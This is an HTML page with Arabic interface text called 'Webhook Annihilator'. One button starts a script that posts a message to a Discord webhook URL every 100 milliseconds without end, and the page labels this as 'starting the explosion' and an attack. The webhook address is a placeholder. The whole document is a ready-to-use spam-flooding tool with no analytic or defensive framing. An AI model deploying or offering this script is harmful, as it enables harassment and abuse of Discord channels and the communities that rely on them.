<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Annihilator</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #ff4757;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }
        button:hover {
            background-color: #ff6b81;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>

    <h1>🔥 Webhook Annihilator 🔥</h1>
    <button onclick="startAttack()">ابدأ التفجير!</button>
    <div id="status">جاهز للهجوم...</div>

    <script>
        
        const webhookUrl = "https://discord.com/api/webhooks/000000000000000000/your_token_here";

        function startAttack() {
            const statusDiv = document.getElementById('status');
            let count = 0;
            
            
            setInterval(() => {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `💥 رسالة رقم ${count} - تم التفجير!`,
                        username: "Annihilator Bot"
                    })
                }).then(response => {
                    if(response.ok) {
                        statusDiv.innerText = `تم الإرسال: ${count} رسالة`;
                        count++;
                    } else {
                        statusDiv.innerText = "حدث خطأ أو وصل للحد المسموح!";
                    }
                });
            }, 100);          }
    </script>

</body>
</html>
